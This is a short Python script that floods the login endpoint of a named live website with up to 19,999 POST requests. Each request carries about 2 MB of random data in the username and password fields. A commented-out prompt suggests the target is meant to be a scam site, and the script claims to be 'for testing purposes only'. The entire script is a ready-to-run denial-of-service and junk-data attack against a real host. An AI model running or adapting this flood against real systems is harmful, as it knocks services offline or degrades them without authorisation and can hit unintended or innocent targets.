import os
import sys
import random
import urllib3
import string

counter = 1
http = urllib3.PoolManager(maxsize=500)


def randomStuff(length=2097152):
  return str(os.urandom(length))


print ("This tool is for testing purposes only.")
#url= input("Enter URL to scamwebsite (e.g.: skinboron.in): ") 

while counter < 20000:
    user = randomStuff()
    password = randomStuff()
    #response = http.request('POST', 'https://'+url+'/auth.php?doAuth=1&login='+user+'&password='+password)
    response = http.request('POST', 'https://hyperxpulse.com/auth.php?doAuth=1&login='+user+'&password='+password)
    print (" user: "+user[0:4]+"[...] / pass: "+password[0:4]+"[...] / size of request: "+str(round(2*sys.getsizeof(user)/1024/1024, 2))+"MB / http_status: "+str(response.status))
    counter += 1
